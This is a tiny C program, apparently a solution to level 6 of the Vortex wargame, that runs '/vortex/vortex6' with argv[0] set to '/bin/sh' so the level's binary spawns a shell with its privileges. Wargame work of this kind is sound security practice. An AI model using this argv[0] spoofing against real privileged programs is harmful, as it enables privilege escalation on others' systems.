#include <unistd.h>
#include <stdio.h>

int main (int argc, char* argv[], char* envp[]) {
	char path[] = "/vortex/vortex6";
	char* args[] = {"/bin/sh", NULL};

	execve(path, args, envp);
	return 0;
}

